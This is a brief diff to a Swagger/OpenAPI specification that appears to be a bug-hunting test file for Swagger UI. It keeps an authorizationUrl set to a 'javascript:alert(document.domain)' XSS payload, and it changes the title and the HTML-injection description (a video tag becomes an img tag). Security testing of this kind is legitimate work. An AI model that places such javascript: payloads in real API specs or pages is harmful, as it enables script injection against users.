@@ -5,8 +5,8 @@ securityDefinitions:
     authorizationUrl: javascript:alert(document.domain)//
 info:
   version: "1.0.0"
-  title: XSS img test
-  description: <video src=https://www.youtube.com/watch?v=-6l7uufU3z4&list=RDFrPfnQn_-cw&index=14&ab_channel=T-Series>
+  title: Bug Hunting is an Arit & I am an Artist!
+  description: <img https://raw.githubusercontent.com/iamarit/SwaggerUiTesting/main/test.png >
 paths:
   /:
     get:
